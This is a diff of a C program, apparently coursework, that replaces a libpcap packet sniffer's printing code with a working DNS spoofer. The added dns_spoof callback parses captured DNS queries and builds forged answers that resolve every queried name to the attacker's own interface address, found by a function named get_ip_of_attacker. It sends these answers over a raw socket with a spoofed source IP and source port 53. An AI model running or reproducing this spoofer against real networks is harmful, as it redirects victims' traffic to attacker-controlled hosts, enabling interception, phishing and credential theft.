@@ -13,325 +13,256 @@
 #include <netdb.h>
 #include <unistd.h>
 #include <net/ethernet.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+#include <resolv.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
+#include <unistd.h>
 
 #define PROMISC 1			/* Promiscuos mode set for pcap_open_live */
-#define READ_TIME_OUT 0	/* read time out for pcap_open_live */
-#define ETHER_ADDR_LEN	6	/* Ethernet addresses are 6 bytes */
+#define READ_TIME_OUT 0		/* read time out for pcap_open_live */
 #define SIZE_ETHERNET 14	/* ethernet headers are always exactly 14 bytes */
+#define IP_SIZE 16
+#define DATAGRAM_SIZE 8192
 
 /* Ethernet header */
-struct sniff_ethernet {
+struct ethernet_header {
 	u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
 	u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
 	u_short ether_type; 				/* IP? ARP? RARP? etc */
 };
 
-/* IP header */
-struct sniff_ip {
-	u_char ip_vhl;			/* version << 4 | header length >> 2 */
-	u_char ip_tos;			/* type of service */
-	u_short ip_len;			/* total length */
-	u_short ip_id;			/* identification */
-	u_short ip_off;			/* fragment offset field */
-#define IP_RF 0x8000		/* reserved fragment flag */
-#define IP_DF 0x4000		/* dont fragment flag */
-#define IP_MF 0x2000		/* more fragments flag */
-#define IP_OFFMASK 0x1fff	/* mask for fragmenting bits */
-	u_char ip_ttl;			/* time to live */
-	u_char ip_p;			/* protocol */
-	u_short ip_sum;			/* checksum */
-	struct in_addr ip_src, ip_dst; /* source and dest address */
+/* DNS header */
+struct dns_header {
+	char id[2];
+	char flags[2];
+	char qdcount[2];
+	char ancount[2];
+	char nscount[2];
+	char arcount[2];
 };
 
-#define IP_HL(ip)		(((ip)->ip_vhl) & 0x0f)
-#define IP_V(ip)		(((ip)->ip_vhl) >> 4)
-
-/* TCP header */
-typedef u_int tcp_seq;
-
-struct sniff_tcp {
-	u_short th_sport;	/* source port */
-	u_short th_dport;	/* destination port */
-	tcp_seq th_seq;		/* sequence number */
-	tcp_seq th_ack;		/* acknowledgement number */
-	u_char th_offx2;	/* data offset, rsvd */
-#define TH_OFF(th)	(((th)->th_offx2 & 0xf0) >> 4)
-	u_char th_flags;
-#define TH_FIN 0x01
-#define TH_SYN 0x02
-#define TH_RST 0x04
-#define TH_PUSH 0x08
-#define TH_ACK 0x10
-#define TH_URG 0x20
-#define TH_ECE 0x40
-#define TH_CWR 0x80
-#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
-	u_short th_win;		/* window */
-	u_short th_sum;		/* checksum */
-	u_short th_urp;		/* urgent pointer */
+/* DNS Question structure */
+struct dns_question {
+	char *qname;
+	char qtype[2];
+	char qclass[2];
 };
 
-/* UDP header */
-struct sniff_udp {
-	u_short uh_sport;	/* source port */
-	u_short uh_dport;	/* destination port */
-	u_short uh_len;
-	u_short uh_sum;		/* checksum */
-};
-
-struct sniff_icmp {
-	unsigned char icmph_type;	/* message type */
-	unsigned char icmph_code;	/* significant when sending error msg */
-	u_short icmph_chksum;		/* checksum for header and data */
-	u_short icmph_ident;		/* idesntifier for matching requests/replies */
-	u_short icmph_seqnum;		/* seq no to aid matching requests/replies */
+/* DNS answer structure */
+struct dns_answer {
+	char *name;
+	char type[2];
+	char class[2];
+	char ttl[4];
+	char rdataLen[2];
+	char *rdata;
 };
 
 
 /*
- * Reference: http://www.tcpdump.org/pcap.html
- * Above link (shared on Piazza) has been used as a
- * sample reference for this homework
+ * get cleaned IP from header
  */
-
-/*
- * print data in rows of 16 bytes: offset hex ascii
- * 00000   47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a   GET / HTTP/1.1..
- */
-void print_hex_ascii_line(const u_char *payload, int len, int offset) {
-	int i;
-	int gap;
-	const u_char *ch;
-
-	/* hex */
-	ch = payload;
-	for (i = 0; i < len; i++) {
-		printf("%02x ", *ch);
-		ch++;
-		/* print extra space after 8th byte for visual aid */
-		if (i == 7)
-			printf(" ");
-	}
-	/* print space to handle line less than 8 bytes */
-	if (len < 8)
-		printf(" ");
-
-	/* fill hex gap with spaces if not full line */
-	if (len < 16) {
-		gap = 16 - len;
-		for (i = 0; i < gap; i++) {
-			printf("   ");
-		}
-	}
-	printf("   ");
-
-	/* ascii (if printable) */
-	ch = payload;
-	for (i = 0; i < len; i++) {
-		if (isprint(*ch))
-			printf("%c", *ch);
-		else
-			printf(".");
-		ch++;
-	}
-
-	printf("\n");
+void get_clean_ip(u_int32_t ip_from_hdr, char* cleaned_ip) {
+	int part1, part2, part3, part4;
+	part1 = (ip_from_hdr) & 0xff;
+	part2 = (ip_from_hdr >> 8) & 0xff;
+	part3 = (ip_from_hdr >> 16) & 0xff;
+	part4 = (ip_from_hdr >> 24) & 0xff;
+	sprintf(cleaned_ip, "%d.%d.%d.%d", part1, part2, part3, part4);
 }
 
 
-/*
- * print packet payload data (avoid printing binary data)
+// http://www.microhowto.info/howto/get_the_ip_address_of_a_network_interface_in_c_using_siocgifaddr.html
+void get_ip_of_attacker(char *if_name, char *ip) {
+	struct ifreq ifr;
+	size_t if_name_len = strlen(if_name);
+	if (if_name_len < sizeof(ifr.ifr_name)) {
+		memcpy(ifr.ifr_name, if_name, if_name_len);
+		ifr.ifr_name[if_name_len] = 0;
+	} else {
+		fprintf(stderr, "interface name is too long");
+	}
+
+	int fd = socket(AF_INET, SOCK_DGRAM, 0);
+	if (fd == -1) {
+		fprintf(stderr, "%s", strerror(errno));
+	}
+
+	if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
+		int temp_errno = errno;
+		close(fd);
+		fprintf(stderr, "%s", strerror(temp_errno));
+	}
+	close(fd);
+
+
+	struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
+	memcpy(ip, inet_ntoa(ipaddr->sin_addr), 32);
+
+
+}
+
+
+/**
+ * Calculates a checksum for a given header
  */
-void print_payload(const u_char *payload, int len) {
-	int len_rem = len;
-	int line_width = 16;			/* number of bytes per line */
-	int line_len;
-	int offset = 0;					/* zero-based offset counter */
-	const u_char *ch = payload;
+unsigned short csum(unsigned short *buf, int nwords) {
+	unsigned long sum;
+	for (sum = 0; nwords > 0; nwords--)
+		sum += *buf++;
+	sum = (sum >> 16) + (sum & 0xffff);
+	sum += (sum >> 16);
+	return ~sum;
+}
 
-	if (len <= 0)
+
+/**
+ * Sends a dns answer using raw sockets
+ */
+void send_dns_answer(char* ip, u_int16_t port, char* packet, int packlen) {
+	struct sockaddr_in to_addr;
+	int bytes_sent;
+	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+	int one = 1;
+	const int *val = &one;
+
+	if (sock < 0) {
+		fprintf(stderr, "Error creating socket");
 		return;
+	}
+	to_addr.sin_family = AF_INET;
+	to_addr.sin_port = htons(port);
+	to_addr.sin_addr.s_addr = inet_addr(ip);
 
-	/* data fits on one line */
-	if (len <= line_width) {
-		print_hex_ascii_line(ch, len, offset);
+	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
+		fprintf(stderr, "Error at setsockopt()");
 		return;
 	}
 
-	/* data spans multiple lines */
-	for ( ;; ) {
-		/* compute current line length */
-		line_len = line_width % len_rem;
-		/* print line */
-		print_hex_ascii_line(ch, line_len, offset);
-		/* compute total remaining */
-		len_rem = len_rem - line_len;
-		/* shift pointer to remaining bytes to print */
-		ch = ch + line_len;
-		/* add offset */
-		offset = offset + line_width;
-		/* check if we have line width chars or less */
-		if (len_rem <= line_width) {
-			/* print last line and get out */
-			print_hex_ascii_line(ch, len_rem, offset);
-			break;
-		}
-	}
+	bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
+	if (bytes_sent < 0)
+		fprintf(stderr, "Error sending data");
 }
 
 
 /* The callback function for pcap_loop */
-void got_packet(char *args, const struct pcap_pkthdr *header, const u_char *packet)
+void dns_spoof(unsigned char *args, const struct pcap_pkthdr *header, const u_char *packet)
 {
 	/* declare pointers to packet headers */
-	const struct sniff_ethernet *ethernet;	/* The ethernet header */
-	const struct sniff_ip *ip;		/* The IP header */
-	const struct sniff_tcp *tcp;	/* The TCP header */
-	const struct sniff_udp *udp;	/* The UDP header */
-	const struct sniff_icmp *icmp;	/* The ICMP header */
+	struct ethernet_header *ether;	/* The ethernet header */
+	struct iphdr *ip;		/* The IP header */
+	struct udphdr *udp;	/* The UDP header */
+	char src_ip[IP_SIZE], dst_ip[IP_SIZE];
+	unsigned int ip_header_size;
+	u_int16_t port;
+	struct dns_question question, reply_question, *dns_question_in;
+	struct dns_answer repy_answer;
+	struct dns_header *dns_hdr, reply_dns_hdr;
+	char request[150], *domain_name;
+	char datagram[DATAGRAM_SIZE];
+	int size, i = 1, j = 0, k;
+	// char* answer;
+	unsigned int datagram_size;
+	char spoof_ip[32];
+	char *reply;
+	unsigned char ans[4];
+	struct ip *ip_hdr;
+	struct udphdr *udp_hdr;
 
-	const char *payload;		/* Packet payload */
-	int size_ip;				/* size of ip packet */
-	int size_tcp;				/* size of tcp packet */
-	int size_udp = 8;			/* size of udp packet */
-	int size_icmp = 8;			/* size of icmp packet */
-	int size_payload;			/* size of payload */
-	int sport, dport;			/* src/dest port for tcp/udp */
-	int proto_tcp = 0;			/* flag to mark tcp protocol */
-	int proto_udp = 0;			/* flag to mark upp protocol */
-	int proto_icmp = 0;			/* flag to mark icmp protocol */
-	int epoch_time;				/* for calculating time for packet */
-	time_t epoch_time_as_time_t;
-	struct tm * timeinfo;
-	char *protocol;				/* string to hold protocol & print later */
-	char payload_str[size_payload + 1]; /* string to hold payload */
-	char *ether_type;			/* string to hold ether type */
+
+	get_ip_of_attacker("ens33", spoof_ip);
+
+	memset(datagram, 0, DATAGRAM_SIZE);
 
 	/* define ethernet header */
-	ethernet = (struct sniff_ethernet*)(packet);
+	ether = (struct ethernet_header*)(packet);
 
-	/* define/compute ip header offset */
-	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
-	size_ip = IP_HL(ip) * 4;
-	if (size_ip < 20) {
-		printf("Invalid IP header length: %u bytes\n", size_ip);
-		return;
-	}
+	ip = (struct iphdr*)(((char*) ether) + sizeof(struct ethernet_header));
 
-	switch (ip->ip_p) {
-	case IPPROTO_TCP:
-		/* define/compute tcp header */
-		tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
-		size_tcp = TH_OFF(tcp) * 4;
-		if (size_tcp < 20) {
-			printf("Invalid TCP header length: %u bytes\n", size_tcp);
-			return;
+	get_clean_ip(ip->saddr, src_ip);
+	get_clean_ip(ip->daddr, dst_ip);
+
+	/* udp header */
+	ip_header_size = ip->ihl * 4;
+	udp = (struct udphdr*)(((char*) ip) + ip_header_size);
+
+	// port = ntohs(*(u_int16_t*)&udp);
+
+	/* dns header */
+	dns_hdr = (struct dns_header*)(((char*) udp) + sizeof(struct udphdr));
+	question.qname = ((char*) dns_hdr) + sizeof(struct dns_header);
+
+	// parse_dns_request(&dns_query, request);
+	// parse domain name
+	domain_name = question.qname;
+	size = domain_name[0];
+	while (size > 0) {
+		for (k = 0; k < size; k++) {
+			request[j++] = domain_name[i + k];
 		}
-		protocol = "Protocol: TCP";
-		/* define/compute tcp payload (segment) offset */
-		payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
-		/* compute tcp payload (segment) size */
-		size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
-		sport = ntohs(tcp->th_sport);
-		dport = ntohs(tcp->th_dport);
-		proto_tcp = 1;
-		break;
-	case IPPROTO_UDP:
-		/* define/compute udp header */
-		udp = (struct sniff_udp*)(packet + SIZE_ETHERNET + size_ip);
-		/* define/compute udp payload (segment) offset */
-		payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_udp);
-		/* compute udp payload (segment) size */
-		size_payload = ntohs(ip->ip_len) - (size_ip + size_udp);
-		protocol = "Protocol: UDP";
-		sport = ntohs(udp->uh_sport);
-		dport = ntohs(udp->uh_dport);
-		proto_udp = 1;
-		break;
-	case IPPROTO_ICMP:
-		/* define/compute icmp header */
-		icmp = (struct sniff_icmp*)(packet + SIZE_ETHERNET + size_ip);
-		/* define/compute icmp payload (segment) offset */
-		payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_icmp);
-		/* compute icmp payload (segment) size */
-		size_payload = ntohs(ip->ip_len) - (size_ip + size_icmp);
-		protocol = "Protocol: ICMP";
-		proto_icmp = 1;
-		break;
-	default:
-		protocol = "Protocol: OTHER";
-		break;
+		request[j++] = '.';
+		i += size;
+		size = domain_name[i++];
 	}
+	request[--j] = '\0';
 
-	/* don't do anything if string not present in payload */
-	if (args != NULL && strstr(payload, args) == NULL) {
-		goto end;
-	}
 
-	/* print the information */
-	epoch_time = header->ts.tv_sec;
-	epoch_time_as_time_t = epoch_time;
-	timeinfo = localtime(&epoch_time_as_time_t);
-	printf("\nTimestamp: %s", asctime(timeinfo));
-	printf("Source MAC Address: %s\n",
-	       ether_ntoa((const struct ether_addr *)&ethernet->ether_shost));
-	printf("Destination MAC Address: %s\n",
-	       ether_ntoa((const struct ether_addr *)&ethernet->ether_dhost));
-	printf("Ether Type: 0x%x\n", ntohs(ethernet->ether_type));
-	printf("Packet Length: %d\n", header->len);
-	printf("Payload Size: %d\n", size_payload);
-	printf("Source IP: %s\n", inet_ntoa(ip->ip_src));
-	printf("Destination IP: %s\n", inet_ntoa(ip->ip_dst));
-	printf("%s\n", protocol);
-	/* print protocol specific data */
-	if (proto_tcp || proto_udp) {
-		/* print data common to both tcp and udp */
-		printf("Source port: %d\n", sport);
-		printf("Destination port: %d\n", dport);
-		/* print data specific to tcp */
-		if (proto_tcp) {
-			/* print the tcp flag for the packet */
-			printf("TCP Flags: ");
-			if (tcp->th_flags & TH_FIN) {
-				printf("TH_FIN ");
-			}
-			if (tcp->th_flags & TH_SYN) {
-				printf("TH_SYN ");
-			}
-			if (tcp->th_flags & TH_RST) {
-				printf("TH_RST ");
-			}
-			if (tcp->th_flags & TH_ACK) {
-				printf("TH_ACK ");
-			}
-			if (tcp->th_flags & TH_URG) {
-				printf("TH_URG ");
-			}
-			if (tcp->th_flags & TH_ECE) {
-				printf("TH_ECE ");
-			}
-			if (tcp->th_flags & TH_CWR) {
-				printf("TH_CWR ");
-			}
-			printf("\n");
-		}
-	} else if (proto_icmp) {	/* print data specific to icmp */
-		printf("ICMP Message Type: %u\n", icmp->icmph_type);
-	} else {	/* print raw payload for unknown protocol */
-		printf("Raw Payload for unknown protocol: %s\n", payload);
-		printf("\n\n#################### NEXT PACKET ####################\n");
-		goto end;
-	}
+	/* reply is pointed to the beginning of dns header */
+	reply = datagram + sizeof(struct ip) + sizeof(struct udphdr);
 
-	/* print payload if present */
-	if (size_payload > 0) {
-		printf("\nPayload:\n");
-		print_payload(payload, size_payload);
-	}
+	// reply dns_hdr
+	memcpy(&reply[0], dns_hdr->id, 2);
+	memcpy(&reply[2], "\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00", 10);
 
-	/* print marker for the next packet */
-	printf("\n\n#################### NEXT PACKET ####################\n");
-end: ;
+	// reply dns_question
+	dns_question_in = (struct dns_question*)(((char*) dns_hdr) + sizeof(struct dns_header));
+	size = strlen(request) + 2;
+	memcpy(&reply[12], dns_question_in, size);
+	size += 12;
+	memcpy(&reply[size], "\x00\x01\x00\x01", 4);
+	size += 4;
+
+	// reply dns_answer
+	memcpy(&reply[size], "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x22\x00\x04", 12);
+	size += 12;
+	sscanf(spoof_ip, "%d.%d.%d.%d", (int *)&ans[0], (int *)&ans[1], (int *)&ans[2], (int *)&ans[3]);
+	memcpy(&reply[size], ans, 4);
+	size += 4;
+
+	datagram_size = size;
+
+	// IP datatgram
+	ip_hdr = (struct ip *) datagram;
+	udp_hdr = (struct udphdr *) (datagram + sizeof (struct ip));
+	ip_hdr->ip_hl = 5; //header length
+	ip_hdr->ip_v = 4; //version
+	ip_hdr->ip_tos = 0; //tos
+	ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + datagram_size;  //length
+	ip_hdr->ip_id = 0; //id
+	ip_hdr->ip_off = 0; //fragment offset
+	ip_hdr->ip_ttl = 255; //ttl
+	ip_hdr->ip_p = 17; //protocol
+	ip_hdr->ip_sum = 0; //temp checksum
+	ip_hdr->ip_src.s_addr = inet_addr(dst_ip); //src ip - spoofed
+	ip_hdr->ip_dst.s_addr = inet_addr(src_ip); //dst ip
+
+	udp_hdr->source = htons(53); //src port - spoofed
+	// udp_hdr->dest = htons(port); //dst port
+	udp_hdr->dest = udp->source;
+	udp_hdr->len = htons(sizeof(struct udphdr) + datagram_size); //length
+	udp_hdr->check = 0; //checksum - disabled
+
+	ip_hdr->ip_sum = csum((unsigned short *) datagram, ip_hdr->ip_len >> 1); //real checksum
+
+	/* update the datagram size with ip and udp header */
+	datagram_size += (sizeof(struct ip) + sizeof(struct udphdr));
+
+	/* sends our dns spoof msg */
+	send_dns_answer(src_ip, port, datagram, datagram_size);
+	// // printf("%s\n", datagram);
+	printf("host %s \t %s\n", src_ip, request);
 }
 
 
@@ -350,7 +281,7 @@ int main(int argc, char *argv[])
 	char dns_filter[200];
 	int bpf_filter = 0;				/* flag to mark bpf_filter expression */
 	int option = 0;					/* for switching on getopt */
-	char *filter_str = NULL;		/* filter string */
+	unsigned char *filter_str = NULL;		/* filter string */
 	char *file_name;				/* filename for read option */
 
 
@@ -494,9 +425,8 @@ int main(int argc, char *argv[])
 		exit(EXIT_FAILURE);
 	}
 
-
 	/* set our callback function with infinite pcap_loop */
-	pcap_loop(handle, -1, got_packet, filter_str);
+	pcap_loop(handle, -1, dns_spoof, filter_str);
 
 	/* clean up */
 	pcap_freecode(&fp);
